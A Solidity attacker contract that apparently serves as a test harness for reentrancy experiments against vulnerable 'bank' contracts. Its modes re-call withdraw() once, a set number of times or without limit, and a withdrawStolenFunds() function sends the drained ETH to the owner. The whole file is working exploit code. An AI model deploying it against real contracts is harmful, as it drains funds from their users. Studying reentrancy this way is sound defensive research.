// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

// One attacker contract, reused across every victim/scenario combination.
// `mode` selects what receive() does when the victim's withdraw() sends
// ETH back:
//   0 = NO_ATTACK  - never reenters (baseline: legitimate single withdrawal)
//   1 = SINGLE     - reenters exactly once
//   2 = MULTIPLE   - reenters up to maxAttempts times
//   3 = UNLIMITED  - keeps reentering as long as the bank can still cover depositAmount
//
// Every mode gates reentry on `address(target).balance >= depositAmount`
// before calling withdraw() again. withdraw() on every victim contract in
// this suite reverts on a failed/insufficient send, and a revert deep in
// the reentrant chain cascades back up through every require(success) in
// between - so calling withdraw() when it can't be satisfied would abort
// the whole attack() transaction instead of just stopping the loop.
contract AttackerConfigurable {
    IBank public immutable target;
    address public owner;

    uint256 public attackCount;
    uint256 public depositAmount;

    uint8 public mode;
    uint256 public maxAttempts;

    constructor(address _target) {
        target = IBank(_target);
        owner = msg.sender;
    }

    function setMode(uint8 _mode, uint256 _maxAttempts) external {
        require(msg.sender == owner, "Not owner");
        require(_mode <= 3, "Invalid mode");
        mode = _mode;
        maxAttempts = _maxAttempts;
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack with");
        attackCount = 0;
        depositAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        attackCount++;

        if (mode == 0) return;

        uint256 remaining = address(target).balance;
        if (remaining < depositAmount) return;

        if (mode == 1) {
            if (attackCount == 1) target.withdraw();
        } else if (mode == 2) {
            if (attackCount <= maxAttempts) target.withdraw();
        } else if (mode == 3) {
            target.withdraw();
        }
    }
}
